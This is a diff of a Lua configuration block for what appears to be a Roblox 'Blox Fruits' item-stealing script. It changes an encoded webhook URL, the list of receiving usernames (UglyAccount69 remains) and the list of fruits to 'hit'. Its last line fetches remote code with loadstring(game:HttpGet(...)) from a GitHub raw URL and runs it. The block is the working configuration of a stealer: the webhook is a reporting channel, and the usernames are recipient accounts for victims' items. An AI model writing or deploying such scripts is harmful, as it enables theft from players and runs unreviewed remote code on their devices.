@@ -1,5 +1,5 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=bXN6RU5UNTBuSUQ1VXBJRVA3Mzg2dzpXc0pSZEY4dlVGcHlZejRtZ1lvUnVFblY4dzFOWFBydU96eUQ0bFY1cFBvbUN1R1E1SHpVMXBXeTZMeWI3aGhKS2c3cmNLaEo4SVlWcjRCTkVkc015LUZ4Um5BS3J4UlJIM0UwNWZYWVJrUDV5aTEtQlhDbXM3MC1PUjNMR2c1SEZQd29OZlZPQjY2YWdiZW5zd3MwMzhlZm1NYXhpeTFSU1B4QXhJY1VNUnc"
-Usernames = {"UglyAccount69", "Dragonisop13"}
-FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Gas-Gas", "Dough-Dough", "Control-Control"}
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=YUZ0cURfTmdmMFUxOFIzc2p1cU9QdzoydzF2eGRKX2tIQ28wN01rQUFtbTJRaGhnNlVKQkZuVXVrNVFPbW9EdXB2OUhYRlA3V2FHMzZMdmR0Vm1FS2tjR3VzZFp2VW03ZkpyN2FYSkZ0MzROeGM2cm5fLVd4Sjl1ZU9QQVhtRldEOGs5emthVVVmUHpmOVM4RG1aNGdIWGNWODFfR251TEN1YlpyRXFWT0VfbGgzMUZMak1jeTViclVONnd0QmZCMUU"
+Usernames = {"UglyAccount69"}
+FruitsToHit = {"Leopard-Leopard", "Kitsune-Kitsune", "Gas-Gas", "Control-Control", "Yeti-Yeti"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
